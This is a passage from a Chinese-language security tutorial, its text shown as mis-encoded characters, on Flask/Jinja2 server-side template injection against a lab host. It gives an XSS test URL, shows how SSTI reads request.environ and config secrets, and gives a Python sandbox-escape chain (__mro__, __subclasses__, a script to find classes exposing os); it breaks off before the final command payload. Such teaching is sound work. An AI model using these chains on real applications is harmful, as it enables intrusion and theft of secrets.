title="æ¸²æŸ“æ–¹æ³•"></a>æ¸²æŸ“æ–¹æ³•</h4><p>Flaskä¸­çš„æ¸²æŸ“æ–¹æ³•æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯<code>render_template()</code>å’Œ<code>render_template_string()</code></p><p><strong>ä½¿ç”¨ <code>render_template()</code> å‡½æ•°æ¥æ¸²æŸ“ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶</strong> , è¿™ä¸ªæŒ‡å®šçš„æ–‡ä»¶å…¶å®å°±æ˜¯æ¨¡æ¿ã€‚å…¶æ¨¡æ¿æ–‡ä»¶ä¸€èˆ¬æ”¾åœ¨ <code>templates</code> ç›®å½•ä¸‹</p><p>æˆ‘ä»¬åœ¨<code>templates</code>ç›®å½•ä¸‹åˆ›å»º<code>hello.html</code>æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®<code>http://10.100.163.201:5000/hello</code>å¦‚ä¸‹æ‰€ç¤º</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/2.png" alt="2"></p><p>Flask æ˜¯ä½¿ç”¨<code>Jinja2</code> ä½œä¸ºæ¸²æŸ“å¼•æ“çš„ï¼Œåœ¨å®é™…é¡¹ç›®ä¸­ , æ¨¡æ¿å¹¶ä¸æ˜¯çº¯ HTML æ–‡ä»¶ , è€Œæ˜¯ä¸€ä¸ªå¤¹æ‚æ¨¡æ¿è¯­æ³•çš„ HTML æ–‡ä»¶ . ä¾‹å¦‚è¦ä½¿å¾—é¡µé¢çš„æŸäº›åœ°æ–¹åŠ¨æ€å˜åŒ–, å°±éœ€è¦ä½¿ç”¨æ¨¡æ¿æ”¯æŒçš„è¯­æ³•æ¥ä¼ å‚æ•° ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥åœ¨<code>render_template()</code>ä¼ å…¥å‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>,content=<span class="string">'this is a test'</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å°†<code>hello.html</code>æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123; &#123;content&#125; &#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™è®¿é—®<code>http://10.100.163.201:5000/hello</code>å¦‚ä¸‹æ‰€ç¤º</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/3.png" alt="3"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨<code>Jinja2</code>ä¸­ï¼Œä½¿ç”¨<code>{ {} }</code>ä½œä¸ºå˜é‡åŒ…è£¹çš„æ ‡è¯†ç¬¦ï¼Œç”¨äºæ‰“å°æ¨¡ç‰ˆè¾“å‡ºçš„è¡¨è¾¾å¼ã€‚</p><p>å¦ä¸€ä¸ªæ¸²æŸ“å‡½æ•°æ˜¯<code>render_template_string()</code>ï¼Œç”¨æ¥æ¸²æŸ“ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>é€šè¿‡è®¿é—®<code>http://10.100.163.201:5000/test1</code>æŸ¥çœ‹</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/4.png" alt="4"></p><p>ä½†æ˜¯å¦‚æœåœ¨è¯¥å‡½æ•°ä¸­æ²¡æœ‰åšå¥½æœ‰æ•ˆçš„é˜²èŒƒï¼Œå°±ä¼šé€ æˆä¸€äº›ä¸¥é‡çš„å±å®³</p><h4 id="XSSæ”»å‡»"><a href="#XSSæ”»å‡»" class="headerlink" title="XSSæ”»å‡»"></a>XSSæ”»å‡»</h4><p>åœ¨<code>app.py</code>æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡<code>/ssti</code>è·¯ç”±å¯ä»¥å‘é€<code>GET</code>è¯·æ±‚ï¼Œä½†æ˜¯ç”±äºåœ¨åç«¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸€ä¸ªä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™æ ·å°±ä¼šäº§ç”ŸXSSæ”»å‡»ã€‚</p><h5 id="å¸¸è§„çš„getè¯·æ±‚"><a href="#å¸¸è§„çš„getè¯·æ±‚" class="headerlink" title="å¸¸è§„çš„getè¯·æ±‚"></a>å¸¸è§„çš„getè¯·æ±‚</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=test</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/5.png" alt="5"></p><h5 id="xssæ”»å‡»"><a href="#xssæ”»å‡»" class="headerlink" title="xssæ”»å‡»"></a>xssæ”»å‡»</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=%3Cscript%3Ealert(1)%3C/script%3E</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/6.png" alt="6"></p><h4 id="SSTIè¯»å–ç¯å¢ƒå˜é‡"><a href="#SSTIè¯»å–ç¯å¢ƒå˜é‡" class="headerlink" title="SSTIè¯»å–ç¯å¢ƒå˜é‡"></a>SSTIè¯»å–ç¯å¢ƒå˜é‡</h4><p>å¯¹äºFlaskçš„æ¨¡ç‰ˆæ¸²æŸ“è€Œè¨€ï¼Œå¦‚æœæˆ‘ä»¬è¦è®©æœåŠ¡å™¨æ‰§è¡Œä»£ç ï¼Œéœ€è¦å°†æ‰§è¡Œçš„å‘½ä»¤åŒ…è£¹åœ¨<code>{ {} }</code>ä¸­ï¼Œå¯¹äºä¸€ä¸ªGETè¯·æ±‚ï¼ŒåŒ…è£¹åœ¨<code>{ {} }</code>ä¸­çš„å‚æ•°ä¼šè¢«åç«¯è®¡ç®—ï¼Œç„¶åå°†ç»“æœæ‹¼æ¥åˆ°æ¨¡ç‰ˆä¸­ï¼Œå®Œæˆæ¸²æŸ“åè¿”å›ç»™ç”¨æˆ·ã€‚</p><h5 id="request-environ"><a href="#request-environ" class="headerlink" title="request.environ"></a>request.environ</h5><p><code>request</code>æ˜¯Flaskæ¡†æ¶ä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå½“æˆ‘ä»¬è®¿é—®<code>request</code>æ—¶å¯ä»¥çœ‹åˆ°å½“å‰çš„è¯·æ±‚</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/7.png" alt="7"></p><p>åœ¨<code>request</code>å¯¹è±¡ä¸­æœ‰ä¸€ä¸ª<code>environ</code>å¯¹è±¡åï¼Œ<code>request.environ</code>æ˜¯ä¸€ä¸ªä¸æœåŠ¡å™¨ç¯å¢ƒç›¸å…³çš„å¯¹è±¡å­—å…¸</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/8.png" alt="8"></p><h5 id="config-items"><a href="#config-items" class="headerlink" title="config.items"></a>config.items</h5><p><code>congfig</code>ä¹Ÿæ˜¯Flaskæ¡†æ¶ä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå…¶ä¸­ä¹ŸåŒ…å«ä¸€äº›æ•æ„Ÿä¿¡æ¯</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/9.png" alt="9"></p><h4 id="SSTIä»»æ„æ–‡ä»¶è¯»å†™"><a href="#SSTIä»»æ„æ–‡ä»¶è¯»å†™" class="headerlink" title="SSTIä»»æ„æ–‡ä»¶è¯»å†™"></a>SSTIä»»æ„æ–‡ä»¶è¯»å†™</h4><p>å¯¹äºä»»æ„æ–‡ä»¶è¯»å†™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡pythonçš„<code>os</code>æ¨¡å—å®ç°ï¼Œåœ¨Jinja2ä¸­æ˜¯å¯ä»¥ç›´æ¥è®¿é—®pythonçš„ä¸€äº›å¯¹è±¡åŠå…¶æ–¹æ³•çš„ï¼Œå¦‚å­—ç¬¦ä¸²å¯¹è±¡åŠå…¶upperå‡½æ•°ï¼Œåˆ—è¡¨å¯¹è±¡åŠå…¶countå‡½æ•°ï¼Œå­—å…¸å¯¹è±¡åŠå…¶has_keyå‡½æ•°,é‚£ä¹ˆæ€ä¹ˆèƒ½å¤Ÿåœ¨Jinja2æ¨¡æ¿ä¸­è®¿é—®åˆ°pythonä¸­çš„å†…ç½®å˜é‡å¹¶ä¸”å¯ä»¥è°ƒç”¨å¯¹åº”å˜é‡ç±»å‹çš„æ–¹æ³•ï¼Œè¿™å°±ä½¿ç”¨åˆ°äº†pythonæ²™ç›’é€ƒé€¸ã€‚</p><h5 id="pythonæ²™ç®±é€ƒé€¸"><a href="#pythonæ²™ç®±é€ƒé€¸" class="headerlink" title="pythonæ²™ç®±é€ƒé€¸"></a>pythonæ²™ç®±é€ƒé€¸</h5><p>æ²™ç®±é€ƒé€¸å°±æ˜¯åœ¨ä¸€ä¸ªä¸¥æ ¼é™åˆ¶çš„pythonç¯å¢ƒä¸­ï¼Œé€šè¿‡ç»•è¿‡é™åˆ¶å’Œè¿‡æ»¤è¾¾åˆ°æ‰§è¡Œæ›´é«˜æƒé™çš„è¿‡ç¨‹ï¼Œè¿™å°±éœ€è¦æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œåœ¨pythonä¸­ï¼Œå¯æ‰§è¡Œå‘½ä»¤çš„æ¨¡å—æœ‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os</span><br><span class="line">pty</span><br><span class="line">subprocess</span><br><span class="line">platform</span><br><span class="line">commands</span><br></pre></td></tr></table></figure><h5 id="pythoné­”æ³•å‡½æ•°"><a href="#pythoné­”æ³•å‡½æ•°" class="headerlink" title="pythoné­”æ³•å‡½æ•°"></a>pythoné­”æ³•å‡½æ•°</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__ è¿”å›è°ƒç”¨çš„ç±»å‹</span><br><span class="line">__mro__ æŸ¥çœ‹ç±»ç»§æ‰¿çš„æ‰€æœ‰çˆ¶ç±»ï¼Œç›´åˆ°object</span><br><span class="line">__subclasses__ è·å–ç±»æ‰€æœ‰çš„å­ç±»</span><br><span class="line">__bases__ è¿”å›æ‰€æœ‰ç›´æ¥çˆ¶ç±»ç»„æˆçš„å…ƒç»„</span><br><span class="line">__init__ ç±»å®ä¾‹åˆ›å»ºä¹‹åè°ƒç”¨ï¼Œå¯¹å½“å‰å¯¹è±¡çš„å®ä¾‹çš„ä¸€äº›åˆå§‹åŒ–</span><br><span class="line">__globals__ èƒ½å¤Ÿè¿”å›å‡½æ•°æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡</span><br><span class="line">__getattribute__ å½“ç±»è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ— æ¡ä»¶è¿›å…¥æ­¤å‡½æ•°</span><br><span class="line">__getattr__ å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§æ—¶è°ƒç”¨</span><br></pre></td></tr></table></figure><p>å¯¹äºè·å–åˆ°osç±»ä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œå…·ä½“çš„æ“ä½œå¦‚ä¸‹</p><h5 id="è·å–å­—ç¬¦ä¸²çš„ç±»å¯¹è±¡"><a href="#è·å–å­—ç¬¦ä¸²çš„ç±»å¯¹è±¡" class="headerlink" title="è·å–å­—ç¬¦ä¸²çš„ç±»å¯¹è±¡"></a>è·å–å­—ç¬¦ä¸²çš„ç±»å¯¹è±¡</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/10.png" alt="10"></p><h5 id="å¯»æ‰¾åŸºç±»"><a href="#å¯»æ‰¾åŸºç±»" class="headerlink" title="å¯»æ‰¾åŸºç±»"></a>å¯»æ‰¾åŸºç±»</h5><p>è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯åˆ©ç”¨ç»§æ‰¿å…³ç³»æ‰¾åˆ°objectç±»</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/11.png" alt="11"></p><h5 id="å¯»æ‰¾å¯å¼•ç”¨ç±»"><a href="#å¯»æ‰¾å¯å¼•ç”¨ç±»" class="headerlink" title="å¯»æ‰¾å¯å¼•ç”¨ç±»"></a>å¯»æ‰¾å¯å¼•ç”¨ç±»</h5><p>åœ¨objectç±»ä¸‹æŸ¥æ‰¾æ‰€æœ‰çš„å­ç±»ï¼Œç„¶åæŸ¥æ‰¾åˆ°å¯åˆ©ç”¨çš„ç±»</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()</span><br><span class="line">[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'hamt'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'items'&gt;, &lt;class 'Context'&gt;, &lt;class 'ContextVar'&gt;, &lt;class 'Token'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'zipimport._ZipImportResourceReader'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'itertools.accumulate'&gt;, &lt;class 'itertools.combinations'&gt;, &lt;class 'itertools.combinations_with_replacement'&gt;, &lt;class 'itertools.cycle'&gt;, &lt;class 'itertools.dropwhile'&gt;, &lt;class 'itertools.takewhile'&gt;, &lt;class 'itertools.islice'&gt;, &lt;class 'itertools.starmap'&gt;, &lt;class 'itertools.chain'&gt;, &lt;class 'itertools.compress'&gt;, &lt;class 'itertools.filterfalse'&gt;, &lt;class 'itertools.count'&gt;, &lt;class 'itertools.zip_longest'&gt;, &lt;class 'itertools.permutations'&gt;, &lt;class 'itertools.product'&gt;, &lt;class 'itertools.repeat'&gt;, &lt;class 'itertools.groupby'&gt;, &lt;class 'itertools._grouper'&gt;, &lt;class 'itertools._tee'&gt;, &lt;class 'itertools._tee_dataobject'&gt;, &lt;class 'operator.itemgetter'&gt;, &lt;class 'operator.attrgetter'&gt;, &lt;class 'operator.methodcaller'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'collections.deque'&gt;, &lt;class '_collections._deque_iterator'&gt;, &lt;class '_collections._deque_reverse_iterator'&gt;, &lt;class '_collections._tuplegetter'&gt;, &lt;class 'collections._Link'&gt;, &lt;class 'functools.partial'&gt;, &lt;class 'functools._lru_cache_wrapper'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib.ContextDecorator'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class 'enum.auto'&gt;, &lt;enum 'Enum'&gt;, &lt;class 're.Pattern'&gt;, &lt;class 're.Match'&gt;, &lt;class '_sre.SRE_Scanner'&gt;, &lt;class 'sre_parse.State'&gt;, &lt;class 'sre_parse.SubPattern'&gt;, &lt;class 'sre_parse.Tokenizer'&gt;, &lt;class 're.Scanner'&gt;, &lt;class 'typing._Final'&gt;, &lt;class 'typing._Immutable'&gt;, &lt;class 'typing.Generic'&gt;, &lt;class 'typing._TypingEmpty'&gt;, &lt;class 'typing._TypingEllipsis'&gt;, &lt;class 'typing.Annotated'&gt;, &lt;class 'typing.NamedTuple'&gt;, &lt;class 'typing.TypedDict'&gt;, &lt;class 'typing.io'&gt;, &lt;class 'typing.re'&gt;, &lt;class 'importlib.abc.Finder'&gt;, &lt;class 'importlib.abc.Loader'&gt;, &lt;class 'importlib.abc.ResourceReader'&gt;, &lt;class 'rlcompleter.Completer'&gt;]</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/12.png" alt="12"></p><h5 id="å¯»æ‰¾å«æœ‰osåº“çš„ç±»"><a href="#å¯»æ‰¾å«æœ‰osåº“çš„ç±»" class="headerlink" title="å¯»æ‰¾å«æœ‰osåº“çš„ç±»"></a>å¯»æ‰¾å«æœ‰osåº“çš„ç±»</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__mro__[<span class="number">-1</span>].__subclasses__():</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">  <span class="comment">#åœ¨åˆå§‹åŒ–å±æ€§ä¸­ï¼Œå¸¦wrapperçš„è¡¨ç¤ºæ²¡æœ‰é‡è½½ï¼Œå› æ­¤æˆ‘ä»¬å¯»æ‰¾æ²¡æœ‰å¸¦wrapper</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"warpper"</span> <span class="keyword">in</span> repr(i.__init__):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">      <span class="comment">#__globals__å…¨å±€æ–¹æ³•ï¼ŒæŸ¥æ‰¾å½“å‰ç±»åŒ…å«çš„æ‰€æœ‰æ–¹æ³•å’Œå˜é‡åŠå‚æ•°</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"os"</span> <span class="keyword">in</span> repr(i.__init__.__globals__):</span><br><span class="line">print(count, i)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span> &lt;<span class="class"><span class="keyword">class</span> '_<span class="title">frozen_importlib</span>._<span class="title">ModuleLock</span>'&gt;</span></span><br><span class="line"><span class="class">65 &lt;class '_frozen_importlib._DummyModuleLock'&gt;</span></span><br><span class="line"><span class="class">66 &lt;class '_frozen_importlib._ModuleLockManager'&gt;</span></span><br><span class="line"><span class="class">67 &lt;class '_frozen_importlib._installed_safely'&gt;</span></span><br><span class="line"><span class="class">68 &lt;class '_frozen_importlib.ModuleSpec'&gt;</span></span><br><span class="line"><span class="class">79 &lt;class '_frozen_importlib_external.FileLoader'&gt;</span></span><br><span class="line"><span class="class">80 &lt;class '_frozen_importlib_external._NamespacePath'&gt;</span></span><br><span class="line"><span class="class">81 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;</span></span><br><span class="line"><span class="class">83 &lt;class '_frozen_importlib_external.FileFinder'&gt;</span></span><br><span class="line"><span class="class">117 &lt;class 'os._wrap_close'&gt;</span></span><br><span class="line"><span class="class">147 &lt;class 'reprlib.Repr'&gt;</span></span><br><span class="line"><span class="class">154 &lt;class 'functools.partialmethod'&gt;</span></span><br><span class="line"><span class="class">161 &lt;class 'sre_parse.Pattern'&gt;</span></span><br><span class="line"><span class="class">162 &lt;class 'sre_parse.SubPattern'&gt;</span></span><br><span class="line"><span class="class">163 &lt;class 'sre_parse.Tokenizer'&gt;</span></span><br><span class="line"><span class="class">164 &lt;class 're.Scanner'&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä¸­å¯»æ‰¾æ˜¯å¦å­˜åœ¨æ–‡ä»¶è¯»å–çš„æ–¹æ³•ï¼Œä¾‹å¦‚<code>open</code>ã€<code>popen</code>ã€<code>file</code>ç­‰ï¼Œæœ€åæˆ‘ä»¬åœ¨<code>&lt;class 